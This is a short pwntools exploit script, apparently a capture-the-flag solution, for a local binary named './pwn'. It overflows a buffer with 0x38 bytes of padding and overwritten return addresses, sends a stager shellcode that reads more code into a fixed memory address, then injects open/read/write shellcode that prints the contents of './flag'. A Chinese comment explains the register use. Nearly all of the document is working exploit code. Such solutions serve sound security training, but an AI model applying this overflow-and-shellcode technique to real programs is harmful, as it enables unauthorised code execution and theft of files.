from pwn import *

context(log_level='debug', arch='amd64', os='linux')
p = process('./pwn')

shellcode = shellcraft.open('./flag')
shellcode += shellcraft.read('rax', 'rsp', 0x100)  # open 之后rax保存的是fd指针, 所以这里直接读 rax(fd), rsp是 './flag'
shellcode += shellcraft.write(1, 'rsp', 0x100)
payload1 = asm(shellcode)

sh = asm(shellcraft.read(0, '0x233050', 0x42) + '''ret''')
print()
p.recvuntil('little.\n')
p.sendline(sh)

p.recvuntil('time~\n')
payload = b'a' * 0x38 + p64(0x233000) + p64(0x233050)
p.sendline(payload)

p.recvuntil('you!\n')
p.sendline(payload1)
print(hex(len(payload1)))
p.interactive()
